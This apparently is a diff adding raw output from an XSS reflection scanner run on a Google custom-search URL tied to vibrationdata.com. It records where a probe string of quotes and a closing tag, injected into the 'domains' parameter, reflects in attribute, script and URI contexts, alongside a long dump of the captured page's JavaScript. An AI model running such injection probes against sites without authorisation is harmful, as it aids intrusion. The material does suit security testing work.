@@ -1,0 +1,1034 @@
+http://vibrationdata.com/
+
+GET Params:[10]
+['domains', 'q', 'sitesearch', 'client', 'forid', 'ie', 'oe', 'safe', 'cof', 'hl']
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=(uvw"xyz'yxz</zxy&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input name="domains" value='(uvw"xyz&#39;yxz&lt;/zxy' type="hidden">
+<div jsdata="GXYZuf;;AKOAcs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-ilQQzTDavqE0">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="6RlTRPVj2m4FdESELFvRKw==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lli\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22VNn27sLQzwbfVGdBTakV8xCaUZ8\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lli','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","ilQQzTDavqE0","r-ilQQzTDavqE0",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['AKOAck','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22site:www.vibrationdata.com\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22VNn27sLQzwbfVGdBTakV8xCaUZ8\x22,\x22\x22,\x22FlWUXoruD_6a4-EP8-mImAk\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','AKOAco','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22site:www.vibrationdata.com\x22]\n,[\x22safe\x22,\x22active\x22]\n,[\x22client\x22,\x22pub-1751731975287442\x22]\n,[\x22domains\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy\x22]\n,[\x22ie\x22,\x22ISO-8859-1\x22]\n,[\x22oe\x22,\x22ISO-8859-1\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','AKOAcs','[0,\x22inline\x22,2,2500,0,0]\n','AKOAcw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586779414\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','AKOAc0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztuExMUOqxD3e4aNpVNDJNCZmhT-OA:1586779414449\x22,3]\n','AKOAc4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586779414259850,104385918,2466395379]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"6RlTRPVj2m4FdESELFvRKw\u003d\u003d","YWHUvb":"18px","rRLesf":"0","gjAni":"#3c4043","KdGe5c":"false","Ym5Ycb":"false","BwgO5":"16","S7nbec":"16","ppkaeb":"0","SidP2e":"rgba(248, 248, 248, 0)","Na6wt":"#e1e1e1","bmQ7Rb":"false","buGAI":"16","X4yPd":"#1c3aa9","pxDH4c":"#0f9d58","KgXmrd":"true","ODgkgd":"#fff","gbf9Eb":"58","hgWJ8c":"false","R9GQh":"#fff","y519we":"true","SpZHZd":"true","EuCkcd":"16","TUhOL":"#fafafa","xeVOLe":"#689f38","vhCwfc":"false","iniaFd":"true","kePaAc":"-4","AYVQWe":"20px","BYw9f":"false","ENmP1c":"rgba(204,204,204,.15)","qmiCId":"true","kkVYtc":"false","VXIo7d":"8px","Sgnmlc":"14px","auaxA":"#222","fjc61":"false","FbN3Qc":"rgba(0,0,0,.87)","FF58Bf":"true","N31mf":"false","EgTnfe":"true","a8Umdd":"rgba(153,153,153,.4)","imHXAf":"true","oyB9kf":"rgba(0,0,0,.87)","kVbEH":"false","dTMnbc":"false","MOPyub":"15","QldWK":"6","tyCgpc":"#fff","ue6nDb":"Roboto-Medium,Roboto-Regular","AQEr7b":"#c6c6c6","PngPbb":"rgba(0,0,0,.87)","hbfefd":"#1A73E8","PxA5sf":"rgba(0,0,0,.54)","jIrJIf":"14","rZYUef":"#f5f5f5","uRoR4d":"false","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","XgWQKd":"true","VQfWj":"#c0c0c0","y1HZEd":"false","khoEPb":"#1a0dab","MiTaT":"#1A73E8","pLhKvc":"0","u4NTBb":"40","RZ03Ve":"#5677fc","o28sBd":"false","o9mzkf":"false","B8Dib":"rgba(0,0,0,.87)","fQC6Cf":"2px","JpB3Ue":"60","Fcb4A":"#1A73E8","zHtpPb":"false","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","b1KZw":"#fff","VbmVYd":"true","rsd6be":"1","ib0wve":"rgba(153,153,153,.2)","wFGKdc":"false","IvNqzc":"true","aUt4Tc":"false","e2p8ee":"false","NIYCKf":"28","SATNMc":"1px solid #dfe1e5","ruHO7c":"#dd191d","klgere":"invert(1) hue-rotate(180deg)","g635Ab":"2px","iKzRxb":"#5f6368","qj36Ef":"#323232","umYEvb":"false","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","GTYTQ":"#ffeb3b","D8A8he":"true","LACYrf":"false","h29koe":"32","iDTSkb":"true","LnZAkd":"false","KVmtZc":"rgba(255,255,255,.3)","JVBnre":"false","xT28q":"false","Vdtb3d":"true","wlwuHd":"false","ZLr84e":"true","Tae7A":"true","JyBo2c":"false","RpI44b":"#ebebeb","lzJv9d":"#fff","xvI8we":"#212121","PuOePe":"false","eo8dye":"#878787","KD9WYe":"#1A73E8","tqXjO":"false","in3Ilb":"#222","s6Rzec":"0 16px","zhBJde":"false","oFa0q":"#fafafa","KnXmRc":"10","n1Whrf":"false","tuTJ6d":"#b8b8b8","ZzVVh":"false","EqX55c":"652","tJ4Jdf":"11","xDKXr":"false","X4DPRd":"true","p7BdKe":"true","nMRhJe":"false","V0Bluc":"none","k7G1xb":"15","q7vEEb":"false","Nk1Bhf":"#4285f4","Mlljec":"false","o07h3e":"0 4px 5px rgba(0,0,0,.16)","SezQgf":"500","W445Dc":"20","hqg9c":"#1878f0","UnFEre":"16","eE52Jd":"#5f6368","pPtK5":"6","PYrjqe":"40","lVRwic":"false","KTkDB":"false","QA73ad":"false","seVajd":"rgba(0,0,0,.12)","xz9C5b":"true","AYXCHc":"false","iwHJId":"15","V6eh7c":"16","owXwYb":"#f8f8f8","hWyTvf":"false","rX9Pnb":"16","abZ6pc":"#f9a825","GzC2p":"#fff","ZxI7Af":"#fafafa","vIMrp":"true","ZMFELd":"false","fFepd":"-15","kL6Xwb":"false","i7mh3e":"16","iryGqc":"2","HjM8R":"#FFF","y2Hs7d":"false","ymIfqf":"18","EiEfXb":"#ebebeb","a7rhWc":"false","QSF9Ec":"","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","K2vQjf":"#f8f8f8","RJegIe":"#fffff0","rWPbFe":"rgba(255,255,255,1)","NW4nA":"rgba(255,255,255,.7)","WnrBce":"rgba(0,0,0,.1)","FYBlgf":"false","YXGVrd":"true","tqmosb":"#fff","BoqNoc":"20px","wB1JTc":"false","ConpTc":"false","AEMHld":"#eeeeee","I69zkb":"rgba(204,204,204,.25)","wku5sd":"false","BdVmgf":"16","By1ejd":"16","A5tF3b":"false","PIn0Ab":"1px solid #DFE1E5","WWz0vd":"false","yFVHo":"true","pDiOce":"false","cdRSXc":"false","eGDqv":"false","dAFa0e":"false","HWmJg":"#dcdcdc","kvKIW":"false","S1ZUDf":"true","v44rSc":"#70757a","VnH1Zb":"normal","Rnt1Qc":"false","X1bUEc":"arial,sans-serif-medium,sans-serif","aD6AQe":"#757575","UNVSy":"false","sBpVac":"rgba(0,0,0,.26)","voc95c":"false","osNyZ":"1.0","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","xBx7Dc":"36","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","LIYDac":"arial,sans-serif","EJG4vf":"pointer","rx1dvd":"#f3f3f3","Dc0uuf":"16","OqjdAf":"true","bXvyY":"#fff","j0DpSe":"false","BW8dtd":"rgba(248, 248, 248, 1)","JcUGee":"rgba(0,0,0,.54)","xFbXr":"rgba(0,102,33,1)","lLCPB":"true","QDXUyc":"#188038","KFdH8":"true","T1V3fc":"#f4b400","WMBRj":"#009688","z70S0c":"false","jg5SCd":"false","bDOvJc":"false","srQSvc":"true","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","bmAEG":"#d9d9d9","pch72b":"false","FydCC":"true","NvsKMd":"true","U6xP0":"#4285f4","F4ULTd":"true","WxHUzd":"true","L6WyEf":"true","fRkoq":"true","ekXXzb":"13px","gqXETb":"#db4437","j9ZYRc":"true","sPiebd":"false","prFQBe":"#ebebeb","eXPt4e":"400","SuQiSc":"1.3","gir54":"0.4","TKn0F":"20px","qkXvHd":"500","Vzh4p":"0px 7px 6px -5px #DFE1E5","z1x4kc":"true","SfSmD":"#ebebeb","aKuscd":"#AECBFA","Hzi6pf":"#DFE1E5","AP8pqf":"rgba(0,0,0,.12)","FiZWae":"32","mJempe":"13","ToXxme":"#e5e5e5","tpLZye":"#fff","MoAfyf":"#fff","AwPxw":"false","B0husb":"true","bVUXme":"25","A2aVpb":"50","Utapxe":"-webkit-","QnH6ad":"16","JRGsye":"none","haqSDf":"rgba(0,0,0,.54)","IfHuyb":"rgba(0,0,0,.54)","OjG6Qc":"#000"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","6RlTRPVj2m4FdESELFvRKw\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586779414259850,104385918,2466395379]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw2ZMhi3Jp2qmihULwydR1kM\x26ust\x3d1586865814309942';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22site:www.vibrationdata.com\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22safe\x22 value\x3d\x22active\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22client\x22 value\x3d\x22pub-1751731975287442\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22domains\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22ie\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22oe\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQpwV6BAgLEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [32]
